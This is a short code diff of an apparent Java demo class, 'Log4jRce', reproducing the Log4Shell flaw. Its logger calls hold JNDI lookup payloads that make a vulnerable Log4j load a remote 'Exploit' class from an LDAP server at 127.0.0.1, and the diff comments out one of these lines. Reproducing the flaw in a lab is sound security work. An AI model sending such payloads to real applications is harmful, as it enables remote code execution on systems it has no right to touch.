@@ -27,7 +27,7 @@ public class Log4jRce {
 
         logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
 
-        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit/ }");
+//        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit/ }");
     }
 
 }
